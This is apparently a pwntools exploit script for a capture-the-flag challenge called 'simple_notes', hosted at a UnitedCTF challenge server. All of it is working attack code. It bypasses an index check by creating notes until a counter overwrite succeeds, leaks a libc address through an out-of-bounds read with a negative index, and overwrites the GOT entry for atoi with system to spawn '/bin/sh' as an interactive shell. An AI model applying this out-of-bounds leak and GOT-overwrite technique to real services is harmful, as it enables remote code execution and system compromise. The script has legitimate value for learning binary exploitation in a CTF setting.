#!/usr/bin/env python3

from pwn import *
import ctypes

exe = ELF("./simple_notes")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.terminal = ['st']

def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("challenges.unitedctf.ca", 1234)

def create_note(io, imp, size, data):
    io.recvuntil("> ")
    io.sendline("1")
    io.recvuntil("Importance: ")
    io.sendline(str(imp))
    io.recvuntil("Size: ")
    io.sendline(str(size))
    io.sendline(data)

def read_note(io, idx):
    io.recvuntil("> ")
    io.sendline("3")
    io.recvuntil("Index: ")
    io.sendline(str(idx))

def edit_note(io, idx, imp, size):
    io.recvuntil("> ")
    io.sendline("4")
    io.recvuntil("Index: ")
    io.sendline(str(idx))
    io.recvuntil("Importance: ")
    io.sendline(str(imp))
    io.recvuntil("Size: ")
    io.sendline(str(size))

def main():
    r = conn()

    # overwriting current variable with 0xffffffff to bypass the index check
    for i in range(256):
        create_note(r, i, 9, "asdf")
        log.info(f"Creating note number: {i}")
    create_note(r, -3, 9, "asdf")

    # leaking libc address
    read_note(r, -8)
    r.recvuntil("Importance: ")
    libc.address = int(r.recvline(keepends=False)) - libc.sym.puts
    log.info(f"Leaking libc address : {hex(libc.address)}")

    #overwriting the got entry for atoi to system
    edit_note(r, -6, ctypes.c_int32(libc.sym.system).value, "/bin/sh\0")

    r.interactive()

if __name__ == "__main__":
    main()
